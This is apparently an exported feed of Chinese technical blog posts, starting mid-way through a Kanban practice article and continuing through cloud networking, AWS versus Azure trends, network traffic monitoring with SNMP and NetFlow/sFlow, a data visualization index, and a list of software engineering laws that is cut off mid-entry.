Cards），上面显示了你和你的团队所需的所有必要信息。在基本设置中，故事卡片分为三个主要阶段（列）——To Do(计划做的事情）、In Progress (正在进行)、Done(完成)。根据实际的需要，还可以分为多个阶段。你也可以使用泳道任务（swimlanes）拆分为不同类别，最后根据进程随时移动状态和泳道之间的问题。 3、可视化工作区 The power of Little’s Law to Kanban teams is not its ability to predict WIP, Thoughput or Leadtime. The true power lies in its ability to influence team behavior with its underlying assumptions. 像看板这样的可视化系统因我们对视觉信息的偏好而成为了强有力的工具。真实地看到工作和流程有助于理解。看板墙可以作为一个简单的信息节点，使任何人都能走过来并了解项目的当前状态。— Jim Benson 《Personal Kanban》作者 看板方法要求团队将组织处理信号的规则显式化，利用精益度量体系对系统及时进行分析回顾，不断优化信号处理模式。这就形成了一个完整高效的反馈闭环，最终建立一个具备自我完善能力，并能随着组织发展和环境变化不断演进的自适应系统。— 李兴双 中国工商银行软件开发中心 Kanban看板可视化的一些技巧： Kanban看板墙需放置于工作区醒目位置 不同事件类别使用不同颜色，紧急事件（URGENT）使用醒目颜色（红色） 故事卡片常规要素：编号，标题，负责人，截止日期 故事卡片叠加要素：重要度，约束条件，延期原因等特殊描述 照相机定期快照（周），及时复盘总结（月） 限制进行中（In-Process）事件数量，限制已经完成（Done）事件数量（折叠或者更换新的Kanban看板墙） 总之，Kanban看板系统的本质意义在于促进团队成员对作业流程、过程和风险达成共同理解, 可视化的作用在于增强不确定风险的信息量（故障、阻碍因子、延期原因、特殊要求等），促进系统各方及时作出响应，或者通过快照机制随时复盘、研究改进措施。 二、Kanban看板实践注意事项1、看板墙设计模式 Conway’s law：Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure. 康威定律指出：任何组织在设计一套系统（广义概念上的系统）时，所交付的设计方案在结构上都与该组织的通信结构保持一致。设计一套可以落地的看板墙规则，第一个步骤不是按照教科书照搬其他企业的看板墙风格，而应首先画出自己所在组织的架构图。其内容包括管理架构、关联方和关注重点，在此基础之上再设计横坐标（Workflow）与纵坐标（Items）, 应当尽可能地使看板墙符合组织结构，而不是相反。 规模的增长很容易让工作陷入停滞，沟通成本加上工作划分会导致效率变化。具体表现为团队之间在工作时间里召开的沟通会议呈指数增长，不同团队的工作量差别很大，不同团队的工作节奏紊乱脱节。Kanban看板实践中，应考虑上述情况，在技术上作出特殊处理：例如当团队规模较大时，对看板墙进行拆分，不同的业务单元使用不同的看板，综合管控部门聚焦于较大标的，而技术实现部门侧重于细节。切记只有当工作可以划分时，你才可能通过增加团队成员来提高效率。 2、平衡群体智慧与个体差异 保持群体智慧的唯一方式是保护每个人的独立性。–乔纳-莱勒（Jonah Lehrer） 群体会对特定类型的问题给出较好的答案。当大量的人做出回应时，他们产生了很多答案，但其平均值、中位数或最常见的回答往往会是一个很好的答案。这比人们被彼此隔离来发表独立意见更为可行。……但是，当人们看到别人提供的答案后，就出现了一些不好的事情。人们会修改自己的答案，从而造成最后的答案集合变得不够多样化，这样最好的答案就可能无法脱颖而出。人们通过强化会变得更加自信，但是精确度却没有改进。群体智慧依赖于多样性和独立性。在社交网络上（以及在企业、组织和政府机构工作的人员团队中），同事压力和主导人物可能会降低该团体的智慧。（《火的礼物-人类与计算技术的终极博弈（第4版）》，Sara Baase） 具体落地实践中，需要承认不同团队、不同团队成员的个体差异。这里所说的个体差异主要表表现为性格差异，它通过人对事物的倾向性态度、意志、语言、逻辑、行为方式等方面表现出来。一般情况下，随机组成的团队成员之间，心理风格的差异会非常显著。例如在感知方面，可以划分为亢奋敏感型、被动感知型等；在信息反馈习惯上，存在主动型和滞后型；在计划性方面也有不同的偏好倾向，有人喜欢按部就班的任务模式，有人善于临机应变，处置紧急情况更能触发神经亢奋，然前者则容易陷入焦虑和挫败感。组织模式可以简化为两种，矩阵式：适用于团队成员之间技能、心理强度较为均匀的理想情况；另外一种是集中式：由一名心理风格较为平和的成员负责日常沟通、统一维护看板墙，即适当缓冲敏感型成员的过度信息输出，另外主动轮询其它被动型成员。 3、慎用“高级”看板不管什么时代什么组织，优秀管理的本质就是鼓励准确信息迅速向上、横向和向下传递，而最重要的是向上传递。在Kanban看板实践中，我目前的判断是不建议套用倾向量化方案的“高级”看板。 麦克纳马拉曾在福特汽车公司和五角大楼都创下管理奇迹的“神童”，在越南战争中使用量化准则来指挥越战，却导致越战的美军在结构上鼓励虚假信息向上传递：军队从上到下都渴望好消息，于是心照不宣地制造、传递假消息，甚至发明出所谓“尸体数”、“小便数”等荒唐可笑的考核指标，造成严重后果。麦克纳马拉也因为自己的过于“聪明”、刚愎自用，在战争决策上神话破产、风光不再。 “每个定量指标都表明我们正在打胜仗。— 麦克纳马拉” 量化的破坏性经常被人忽略：第一，机会成本。量化是很耗时的，大量宝贵的管理时间浪费在量化上，做其他重要事情的时间就减少了。第二，量化容易误导决策。定量信息造成了各种各样错得离谱的决策。 当你的组织还远远没有达到精益生产、杜绝延期的境界之前，将敏捷的Kanban看板应用急用进入量化范畴，是不明智的。 扩展阅读：DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 扩展阅读《个人看板：了解工作/驾驭生活》（PersonalKanban:MappingWork|NavigatingLife） 作者：吉姆·本森、托尼安妮·德马里亚·巴里 简介：与其说这是一本关于复杂价值流的书，还不如说是一本关于个人工作效率的书。 《看板方法：科技企业渐进变革成功之道》 Kanban : Successful Evolutionary Change for Your Technology Business 作者：戴维·J.安德森 简介：对于在企业中如何使用看板图描述得更加具体。 拓展阅读 项目管理 | Overview of Project Management PM指南:PMI项目管理知识体系 PM指南:建筑工程项目管理|行业案例教学 PM指南:范围管理 PM指南:进度管理 PM指南:成本管理 PM指南:质量管理 PM指南:资源管理 PM指南:沟通管理 PM指南:风险管理 PM指南:采购管理 PM指南:相关方管理 PM指南:项目管理信息系统|工具与技术 PM指南:项目管理开局模板|工具与技术 PM指南:开源项目管理平台Redmine|工具与技术 PM指南:软件业看板Kanban管理实践|工具与技术 PM指南:源代码版本管理|工具与技术 参考文献 Marcus Hammarberg:Kanban in Action (Youtube Video) Steven Tomas:Little’s Law – the basis of Lean and Kanban PDF《kanban in Action》 Just-in-Time — Philosophy of complete elimination of waste 澎湃新闻：麦克纳马拉：以铁腕重塑五角大楼，却因越战一败涂地 何勉：解析精益产品开发（一）—— 看板开发方法 Kanban Applied to Software Development: from Agile to Lean]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>工具癖</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[云计算 | Overview of Cloud Computing]]></title>
    <url>%2F2017%2F07%2F23%2FCloudComputing%2F</url>
    <content type="text"><![CDATA[摘要 Introducing Cloud Computing 云计算平台的选择:AWS or Azure? Overview of Cloud ComputingIntroduction to Cloud Computing云计算网络 Local network（本地网络）一个只允许在本服务器内通信的虚拟网络，不能跨服务器通信。主要用于单节点上测试，只能做单节点的部署(all-in-one)，这是因为此网络模式下流量并不能通过真实的物理网卡流出，integration bridge并没有与真实的物理网卡做mapping，只能保证同一主机上的vm是连通的。 Flat network基于不使用VLAN 的物理网络实现的虚拟网络，每个物理网络最多只能实现一个虚拟网络。ID数只有1个，通常不用于数据网络，因为其不具备租户隔离型。即所有的虚拟机都在一个广播域。比较传统的网络模式，需求较少。 VLAN network（虚拟局域网）基于物理VLAN 网络实现的虚拟网络。共享同一个物理网络的多个 VLAN 网络是相互隔离的，甚至可以使用重叠的 IP 地址空间。在规模不大的私有云中，往往是用 VLAN 模式，简单、可靠、能够满足规模要求；而在大型的私有云或者公有云中，往往使用VxLAN。 GRE network （通用路由封装网络）一个使用GRE 封装网络包的虚拟网络。GRE 封装的数据包基于 IP 路由表来进行路由，因此 GRE network 不和具体的物理网络绑定。 云计算存储云计算平台的选择:AWS or Azure? 原文链接：Stack Overflow:Trends in Cloud Computing: Who Uses AWS, Who Uses Azure?(2017) 分析师 David Robinson：Data Scientist at Stack Overflow, works in R and Python. 工具：The Stack Overflow Trends tool。数据来源（Stack Overflow问题标签，时间跨度从2008至今）: amazon-web-services、azure。 Traffic to AWS and Azure over time 很明显，AWS和Azure两个平台在2012的流量水平相当，之后AWS增长得更快。 Technologies 开发者标签 AWS Azure 说明 C# 少 压倒性优势 Azure是微软产品，C#是Window技术栈中Web开发的默认选项 Node.js 多 多 Node.js开发者倾向于使用云托管 Python／Ruby Rails 多 少 C／C++ 很少 很少 很少部署在云应用 HTML 很少 很少 不负责配置云平台的前端开发人员和设计人员 By industryAWS的问题覆盖广泛，Azure在特定行业，特别是咨询和能源行业广泛使用的平台。进一步分析表明，这些行业是微软堆栈最受欢迎的行业。相比之下，AWS在技术行业（如软件和网络公司）尤其受欢迎，尤其是在媒体公司（包括出版和娱乐）。同样值得注意的是，“学术”部门、主要由学生和研究人员组成，这些用户访问的语言和技术与美国其他地区相比非常不同。这表明云平台在大学里并没有被广泛教授，或者在研究中广泛使用，至少与Python和R等技术相比。 By country 大部分国家的访问记录来看，关于AWS的问题数量要多于Azure的问题。但是有一个地方例外——荷兰，关于Azure的问题数量是AWS的两倍，一种可能的解释是微软在荷兰建了一个大型数据中心，导致该地区有相对较多的Azure平台开发者。Microsoft has built a major data center in the Netherlands 参考文献 Stack Overflow:Trends in Cloud Computing: Who Uses AWS, Who Uses Azure?(2017) 阿里云MySQL及Redis灵异断连现象：安全组静默丢包解决方法 |纤夫张 数据和云 2月25日 一文读懂常见云计算网络 | 原创： 杨武 新钛云服 2月15日]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Economist</tag>
        <tag>DevOps</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈基于数据分析的网络态势感知]]></title>
    <url>%2F2017%2F07%2F14%2FNetwork-sFlow%2F</url>
    <content type="text"><![CDATA[摘要态势感知（Situational Awareness，SA）的概念最早在军事领域被提出。20世纪80年代，美国空军就提出了态势感知的概念，覆盖感知（感觉）、理解和预测三个层次。90年代,态势感知的概念开始被逐渐被接受，并随着网络的兴起而升级为“网络态势感知（Cyberspace Situation Awareness，CSA）”，指在大规模网络环境中对能够引起网络态势发生变化的安全要素进行获取、理解、显示以及最近发展趋势的顺延性预测，而最终的目的是要进行决策与行动。本文将围绕以下话题讨论网络态势感知中的几个常见问题： 网络感知的基础:网络分层、传感器 网络分析技术：SNMP、NetFlow、sFlow、NetStream、Packet Capturing 网络数据可视化: WireShark、NTopng、Ganglia、GeoIP 一、网络感知的基础1、没有任何一个传感器是全能的测量一个网络的一般步骤如下：首先获得网络拓扑图，网络的连接方法、潜在的观察点列表等；然后确定潜在观察点，确定该位置所能看到的流量；最后，确定最优的覆盖方案。在复杂网络中，没有任何一个传感器能够全面覆盖，需要多种传感器配合使用。按照采集的领域，传感器可以分为三类： 网络：入侵检测系统（IDS）、NetFlow采集器、TCP采集器（如tcpdump） 主机：驻留在主机上，监控主机上的活动（文件访问、登录注销）、网卡流量 服务：邮件消息、特定服务的HTTP请求 2、网络分层对传感器的影响总的来说，网络传感器的焦点是OSI模型中的第2层～第4层，而服务传感器的焦点是第5层及以上。分层对网络流量的影响中，还需要考虑最大传输单元（MTU）：数据帧尺寸的上限，影响到介质中可以传送的封包的最大尺寸，以太网的MTU为1500字节，即IP封包不会超过这个尺寸。OSI模型第5层会话层需要考虑的情况是会话加密，加密后的信息无法直接理解；在第6层和第7层中，必须知道协议细节，才能提取有意义的信息。 二、网络分析技术网络流量反映了网络的运行状态，是判别网络运行是否正常的关键。如果网络所接收的流量超过其实际运载能力，就会引起网络性能下降。网络中流量的各种参数主要包括：接收和发送数据报、丢包率、数据报延迟。 1、SNMPSNMP（ Simple Network Management Protocol )包含一个应用层协议（application layer protocol）、数据库模型（database schema），和一组数据对象。SNMP的第一个RFC系列出现在1988年(RFC1065-1067)，第二版（RFC1441–1452）作了修订，由于第二版的新安全系统被认为过于复杂而不被广泛接受，因此出现了两个方案：SNMP v2c（基于社区，RFC1901–1908）、SNMP v2u(基于用户，RFC1909–1910)。SNMP第三版（RFC3411-3418）主要增加了安全性方面的强化：信息完整性，保证数据包在发送中没有被窜改；认证，检验信息来自正确的来源；数据包加密，避免被未授权的来源窥探。 基于SNMP协议定义的计数器：ifInOctets、ifOutOctets，两次采样的差值除以间隔时间即可获得平均流量。需要注意的是计数器的数据类型有两种：counter32和counter64。counter32计数的最大值是2的32次方减1，当超过4G的时候，计数器就会清零。如果是大流量、高精度采样（间隔时间低于1分钟），需要考虑使用counter64（ifHCInOctets、ifHCOutOctets）,否则可能出现数据偏差，例如： 12345snmpwalk -v 2c -c public -u username 192.168.1.10 ifHCInOctetsIF-MIB::ifHCInOctets.1 = Counter64: 5020760IF-MIB::ifHCInOctets.2 = Counter64: 12343743IF-MIB::ifHCInOctets.3 = Counter64: 7123IF-MIB::ifHCInOctets.21 = Counter64: 3854 2、RMONSNMP是基于TCP/IP、应用最广泛的网管协议，但是也有一些明显的不足，如：SNMP使用轮询方式采集数据信息，在大型网络中轮询会产生巨大的网络管理通讯报文；不支持管理进程的分布式管理，它将收集数据的负担加在网管站上，网络管理站会成为瓶颈；只能从这些管理信息库中获得单个设备的局部信息，标准管理信息库MIB-II(RFC1213)和各厂家的专有MIB库主要提供设备端口状态、流量、错误包数等数据，要想获得一个网段的性能信息是比较困难。 因此IETF提出了RMON（Remote Network Monitoring，RFC2021）以解决SNMP所面临的局限性。RMON 由 SNMP MIB 扩展而来，网络监视数据包含了一组统计数据和性能指标，它们在不同的监视器（或称探测器）和控制台系统之间相互交换。它可以主动地监测远程设备，对设备端口所连接的网段上的各种流量信息进行跟踪统计，如某段时间内某网段上报文总数等。只要给予探测器足够的资源，它还可以对数据设备进行防防性监视，设备主动地对网络性能进行诊断并记录网络性能状况，在发生故障时可以把信息及时通知管理者，相关信息分为统计量、历史、告警、事件等四个组，可以预置规则。 3、NetFlow vs sFlow vs NetStreamNetFlow最早由 Cisco 研发的流量汇总标准，最初用于网络服务计费，本意不是为了流量分析和信息安全。它通过路由器提供收集IP网络流量的能力，分析的NetFlow数据（UDP packets）感知网络流量和拥塞情况。NetFlow的核心概念流（Flow），NetFlow直接从 IP Packet 中复制信息，包含来源及目的地、服务的种类等字段： Source and destination IP address Input and output interface number Source and destination port number Layer 4 Protocol Number of packets in the flow Total Bytes in the flow Time stamp in the flow Source and destination AS TCP_Flag &amp; TOS NetFlow vs IPFIX NetFlow 的主力实现版本是 v5，但是 v5 主要针对 IPv4 存在很多限制，因此 Cisco 推出了基于模版的 NetFlow v9 。在NetFlow v9 的基础上，IETF在2008年发布了标准化的 IPFIX( Internet Protocol Flow Information eXport)（RFC5101/5102），IPFIX 提供了几百种流字段。另外，Juniper也有一套自己的标准 J-Flow 。 sFlow (Sampled Flow, 采样流，RFC3176 )是另一种一种基于报文采样的网络流量监控技术，主要用于对网络流量进行统计分析。sFlow 2001年由lnMon公司提出来，目前是IEFE的一个开放标准，可提供完整的第二层到第四层、全网络范围内的流量信息。sFlow 关注的是接口的流量情况、转发情况以及设备整体运行状况，因此适合于网络异 常监控以及网络异常定位，通过 Collector 可以以报表的方式将情况反应出来，特别适合于企业网用户 。sFlow Agent内嵌于网络设备中，在 sFlow 系统中收集流量统计数据发送到 Collector 端供分析。 NetStream 是H3C定义的一套网络流量的数据统计方法。它需要由特定的设备支持，首先由设备自身对网络流进行初步的统计分析，并把统计信息储存在缓存区。值得注意的是，NetStream（IPv6）功能需要跟华为购买License，并且NetStream功能和sFlow功能不能同时在同一接口板上配置。如果接口板已经配置sFlow功能，则不能配置NetStream功能。 综上所述，各种 NetFlow 方案都是基于网络硬件设施生成或者软件封包为流，不同的厂商标准不同，尤其需要考虑兼容性。同时，各种机制都可能对硬件造成性能问题，特别是旧的型号存在更大的风险，一般不轻易开启。无论是硬件（中高端设备）还是软件（nProbe、nDPI）、NetStream（IPv6），都意味着昂贵的费用，需要充分考虑成本预算。 4、NetFlow的其它替代方案基于软件替代路由采集，基本都是采用封包的思路，将pcap文件当作数据源或者直接从网络接口上封包，通过解析Header聚合成流格式或者更丰富的输出。常见的产品如下： CERT YAT(Yet Another Flowmeter) softflowd QoSient Argus 5、协议和用户识别 我们可以把数据包想像成一封信。根据解析数据报报头的内容，可以分析IP地址、端口号、协议、报文格式等特征，分类后可以实现对各种应用层协议的准确识别，如P2P（迅雷）、即时通信（QQ、微信）、VPN、邮件等。当然，这只能算是“浅度”的数据包检测，就好像是看看信封上的发件人和收件人 。 “深度”的数据包检测，可以理解成对信件内容的探查──相比起暴力打开信封，这种基于机器学习的技术更具有艺术性。它并不实际解读数据包的内容，而是搜集周边信息，对数据流进行“肖像刻划”（Profiling）。国内某研究团队曾发表论文“网络流量分类，研究进展与展望”，文章提到了多种使用机器学习进行“深度数据包检测”（Deep Packet Inspection，DPI）的技术。对“墙”有兴趣的同学可以深入了解,https://riboseyim.github.io/2017/05/12/GFW/ 。 三、网络数据可视化1、面向流向分析的可视化文中开头我们就提到测量网络的第一步就是获得网络拓扑图，如果要获得全局角度实时感知能力，需要在拓扑的基础之上叠加通过各种网络分析技术获得的流量/Flow/事件等信息，进而处理分析网络异常流量。能够实用的数据分析具有相当的复杂性，需要专门的工具软件，区分正常流量数据和异常流量数据、对于“异常模式”的算法训练都有一定门槛，因此存在大量的开源和商业解决方案。 2、面向故障诊断的可视化 抓包工具：tcpdump、TShark、 WinDump 图形化工具：wireshark(客户端)、ntopng(webUI) 自定义编程：R、Python(Python-Scapy)、Graphviz工具包 一个典型的故障场景：两个服务之间发生故障、无法收发信息，可以通过tcpdump的抓包，并将抓包结果在WireShark上分析，基于染色的方式通信失败的报文被高亮提示。TCP通信中客户端向服务端发送tcp zero window（表示没有window可以接收新数据），如果出现该特征一般可以确定故障是由接收端服务器TCP缓冲区占满的引起，应将排查方向锁定在接收端。关于网络数据包的捕获、过滤、分析的具体实现细节，可以参考：Packet Capturing:关于网络数据包的捕获、过滤和分析 在企业应用中，网络监测数据通常需要与基础监控平台融合才能发挥最大价值（开源的方案 Zabbix/Ganglia/Nagios／Graphite 等）。Collectd 与Ganglia 是竞争关系，都是C语言开发,数据输出都是RRDTool，性能应该差不多，Collectd不包含图形化组件。zabbix是覆盖面比较广的综合套件，除了采集还有告警等其它管理功能，专业性和大规模应用方面可能就不太强。Nagios在思路方面比较接近zabbix,走的是综合性路子，侧重于告警方案：“Ganglia is more concerned with gathering metrics and tracking them over time while Nagios has focused on being an alerting mechanism.” 在Ganglia项目中提供了一个 gmond_proxy 可以搭配 sFlow-RT 支持 NetFlow／sFlow 的数据收集，如果是自己实现 sFlow-RT 类似的组件也需要考虑对 Logstash/splunk的支持。 开源项目 开发语言 定位 说明 Collectd C 数据采集器 不包含图形化组件 Ganglia C，PHP（front-end） 数据采集器 包含一个Web图形化组件 Zabbix C，PHP（front-end） Server-Client 不包含图形化扩展插件 Nagios C ，PHP（front-end） Core+Plugins 包含多种图形化扩展插件 Grafana Go 指标数据的可视化展现板 需要提前对数据进行时序化处理，例如 InfluxDB 等 扩展阅读 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 3、面向安全分析的可视化 流向&amp;协议：Ntopng 地理位置服务，根据IP地址确定改地址的物理位置信息（坐标）：MaxMind GeoIP 安全威胁情报服务，通过信息共享渠道了解识别攻击者的来源、类型和安全厂商确认情况，做到知己知彼。 扩展阅读SDN 网络中的可视化与数据封包 DPDK(Data Plane Development Kit)运行于Intel X86平台，是 Intel 开源的一组快速处理数据包的开发平台及接口（BSD）。重载了网卡驱动，该驱动在收到数据包后不中断通知CPU，而是将数据包通过零拷贝技术存入内存，这时应用层程序就可以通过DPDK提供的接口，直接从内存读取数据包。这种处理方式节省了CPU中断时间、内存拷贝时间，并向应用层提供了简单易行且高效的数据包处理方式，使得网络应用的开发更加方便。 Network Engineering SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow Preview SDN 技术指南（三）：OpenDaylight or Floodlight ? SDN 技术指南（四）：Open vSwitch Preview SDN 技术指南（五）：NFV Preview SDN 技术指南（六）：OpenStack or Kubernetes ? Preview SDN 技术指南（七）：产业联盟与标准化组织 Preview SDN 技术指南（八）：案例 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: IPv6 &amp; Security AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 Cyber-Security|香港拟增设网络安全与科技罪案总警司 参考文献 sFlow: Theory and Practice of a Sampling Technology and Its Analysis with Wireshark 维基百科：NetFlow sflow.com:InfluxDB and Grafana sflow.com:Metric export to Graphite sflow.com:Exporting events using syslog sflow.com:Cluster performance metrics sflow.com:Using a proxy to feed metrics into Ganglia 李晨光：详解网络流量分析 飞翔的单车：解决zabbix用snmp监控网络流量不准的问题 lifeofzjs.com:Nagios监控工具介绍 王基立:Nagios企业级系统监控方案 Top 10 Best Free Netflow Analyzers and Collectors for Windows JUNIPER Networks:Juniper Flow Mornitoring nProbe:An Extensible NetFlow v5/v9/IPFIX Probe for IPv4/v6 华为：一种计算机网络远程网络监控方法，CN 1393801 A Cisco Systems NetFlow Services Export Version 9 manageengine.com：NetFlow Analyzer - Supported Devices H3C.com:NetStream技术介绍]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>OpenSource</tag>
        <tag>网络协议</tag>
        <tag>数据可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化 | Overview of Data Visualization]]></title>
    <url>%2F2017%2F07%2F06%2FVisualization%2F</url>
    <content type="text"><![CDATA[摘要 工程绘图：OmniGraffle 绘图指南 自动分析：基于 Graphviz 实现程序化绘图 数字地图：开源 GIS 技术简史 开源情报：基于网络爬虫制作可视化图表 时序数据：常见的数据可视化仪表盘 概率统计：基于 Go + R 可视化古典音乐作曲家社交网络 在线演示案例 案例 图表 数据可视化 投机指标 科学指标 运动指标 旅行指标 创造指标 案例：最近十年全国彩票销售变化情况 在线演示 案例：中国科学院院士分布（出生地与籍贯）在线演示 案例：美国航空入境旅客（出发地）变化情况 在线演示 案例：世界主要国家专利申请变化情况（欧洲专利局） 在线演示 专题 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 数据可视化（八）Program,Data and Classical Music 数据可视化（十）公共数据源列表 前沿 Introducing AVS, an Open Standard for Autonomous Vehicle Visualization from Uber 扩展阅读《The Data Visualization Master》Science Modern data visualization and analytics for life sciences 参考文献 Nature：数据可视化可提高科研成果的可重复性 | 2018-03-05 生命奥秘 生物探索 邱俊涛：一张漂亮的可视化图表背后 NASA中文：一个新的蓝色星球 Nature :告别信息混乱，如何制作清晰的通路图？ 《纽约时报》的“爷爷级”数据可视化|2017-09-27 新京报传媒研究]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Developer</tag>
        <tag>数据可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软件工程实践中的十大法则]]></title>
    <url>%2F2017%2F07%2F05%2FLaw-Of-Engineering%2F</url>
    <content type="text"><![CDATA[摘要 0.1 Moore’s Law 0.2 Metcalfe’s Law 1、Little’s Law 2、Goodhart’s Law 3、Conway’s Law 4、Parkinson’s Law 5、Humphrey’s Law 6、Law of the instrument 7、Law of Demeter 8、Dude’s Law 9、Law of 2 Feet 10、Law of Propinquity 11、Linus’ Law 0.1 Moore’s Law摩尔定律,由英特尔创始人之一戈登·摩尔提出来的。其内容为：积体电路上可容纳的电晶体（晶体管）数目，约每隔两年便会增加一倍。主要有以下三种演绎版本： 集成电路芯片上所集成的电路的数目，每隔18个月就翻一倍。 微处理器的性能每隔18个月提高一倍，或价格下降一半。 用一个美元所能买到的电脑性能，每隔18个月翻两倍。 这个定律 被引用最多，分歧很大，反对声音也最多，有预测认为摩尔定律的极限将在2025年左右到来，但也有更乐观的预测认为还能持续更久。 0.2 Metcalfe’s Law梅特卡夫定律，由乔治·吉尔德于1993年提出，但以计算机网络先驱、3Com公司的创始人罗伯特·梅特卡夫的姓氏命名。内容是：一个网络的价值等于该网络内的节点数的平方，而且该网络的价值与联网的用户数的平方成正比。该定律指出，一个网络的用户数目越多，那么整个网络和该网络内的每台电脑的价值也就越大。 1. Little’s LawCycle Time = Work in Progress / Throughput 中译为利特尔法则，由MIT （Sloan School of Management）的教授John Little于1961年提出：在一个稳定的系统 L中，长期的平均顾客人数，等于长期的有效抵达率，系统中的平均存货等于存货单位离开系统的比率（亦即平均需求率）与存货单位在系统中平均时间的乘积。 the relationship between the average number of customers in a store, their arrival rate, and the average time in the store. 应用领域：精益生产、系统运筹方面应用广泛，Kanban(看板)方法论的基石。 It is the basis of Kanban. The power of Little’s Law to Kanban teams is not its ability to predict WIP, Thoughput or Leadtime. The true power lies in its ability to influence team behavior with its underlying assumptions. 2. Goodhart’s Law When a measure becomes a target, it ceases to be a good measure.当一个政策变成目标，它将不再是一个好的政策。 古德哈特定律（Goodhart’s law），是以Charles Goodhart的名字命名，他在1975年的文章中首次发表（当时作为英格兰银行的政策建议）：当政府试图管理这些金融财产的特别标识时，它们便不再是可信的经济风向标。应用领域：公共管理，敏捷开发，目标管理 了解一个指标有意义与否的一个好的方法是试着去理解其所体现的个人价值。关注那些可以给出好的建议、体现沟通技能和良好态度，尤其是需要巨大的付出才能作弊的指标。 程序员日志：是什么导致优秀的程序员写出如此垃圾的代码？ blogospheroid:The Importance of Goodhart’s Law 3. Conway’s LawAny organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure.任何组织在设计一套系统（广义概念上的系统）时，所交付的设计方案在结构上都与该组织的通信结构保持一致 – Melvyn Conway, 1967 《人月神话》：Adding manpower to a late software project makes it later –Fred Brooks, (1975) 为了赶进度加程序员就像用水去灭油锅里的火一样，原因在于：沟通成本 = n(n-1)/2，沟通成本随着项目或者组织的人员增加呈指数级增长。很多项目在经过一段时间的发展之后，都会有不少恐龙级代码，无人敢挑战。比如一个类的规模就多达数千行，核心方法近千行，大量重复代码，每次调整都以失败告终。庞大的系统规模导致团队新成员接手困难，项目组人员增加导致的代码冲突问题，系统复杂度的增加导致的不确定上线风险、引入新技术困难等。应用领域：Micro-Service 微服务 4. Parkinson’s Law Work expands so as to fill the time available for its completion.在工作能够完成的时限内，工作量会一直增加，直到所有可用时间都被填充为止 帕金森定理（英语：Parkinson’s law），由英国作家西里尔·诺斯古德·帕金森提出，语最早出现在1955年《经济学人》中的幽默短文。在他后续的书中进一步阐述（《Parkinson’s Law: The Pursuit of Progress》）。官僚组织随着时间而扩大的速率。一个官僚组织(作者注：包括非政府组织)中的雇员总数，通常以每年5-7%的速度增加。他认为，有两股力量造成了这个增长：(1) 一个官员希望他的下属增加，但不希望解雇造成敌人增加；以及(2) 官员会制造工作给彼此。 同意！ 5. Humphrey’s Law The user will never know what they want until after the system is in production (maybe not even then)用户将永远不知道他们想要什么，直到系统已经上线。（也许上线了也不知道） “服务员，给我来份宫保鸡丁！”“好嘞！”————这叫原始需求大厨做到一半。“服务员，菜里不要放肉。”“不放肉怎么做啊？”“不放肉就行了，其它按正常程序做，不就行了，难吗？”“好的您稍等”————中途需求变更大厨：”你大爷，我肉都回锅了”服务员：”顾客非要要求的嘛，你把肉挑出来不就行了吗”大厨：”行你大爷” 然而还是一点点挑出来了————改动太大，部分重构。。。。。。“服务员，这样吧，腐竹不要了，换成蒜毫能快点吗？对了，顺便加点番茄酱”————因工期过长再次改动需求大厨：”我日了狗啊，你TM不知道蒜毫也得焯水啊？还有你让我怎么往热菜里放番茄酱啊？？”服务员：”焯水也比等腐竹强吧，番茄酱往里一倒不就行了吗？很难吗？”大厨：”腐竹我还得接着泡，万一这孙子一会又想要了呢。”————频繁改动开始导致大量冗余 冷兔笑话：码农做项目与点菜类比的笑话 John Eaton:The Three Laws of Software Development - Humphrey’s Law 6. Law of the instrument If all you have is a hammer, everything looks like a nail 工具定律，锤子定律或马斯洛的锤子。表现为对一个熟悉的工具过度的依赖，“如果你有的只是一个锤子，那么所有的东西看起来都像一个钉子”以及一些由此转化的说法，来自于亚伯拉罕·马斯洛1966年发行的《科学的心理学》一书。例如： “XXX是世界上最好的语言，没有之一” “加强party的领导” Youtube:Law of the instrument 7. Law of Demeter Law of Demeter is also called “Principle of Least Knowledge” 得墨忒耳定律（Law of Demeter，缩写LoD）是一种软件开发的设计指导原则，特别是面向对象的程序设计。美国东北大学在1987年末发明，名称来源于希腊神话中的农业女神，孤独的得墨忒耳。简单描述为: 每个单元对于其他的单元只能拥有有限的知识：只是与当前单元紧密联系的单元； 每个单元只能和它的朋友交谈：不能和陌生单元交谈； 只和自己直接的朋友交谈。 a.b.Method()违反了此定律，而a.Method()不违反此定律。一个简单例子是，人可以命令一条狗行走（walk），但是不应该直接指挥狗的腿行走，应该由狗去指挥控制它的腿如何行走。 Dan Manges:Misunderstanding the Law of Demeter 8. Dude’s LawValue (of a project) = Why over How [or Value = Why / How] “David [the law’s creator] comes from the music industry. New musicians focus on having a nice sound. Professional musicians first think about the mood of the song, the emotion they want to bring across and then work out the sound that fits it” 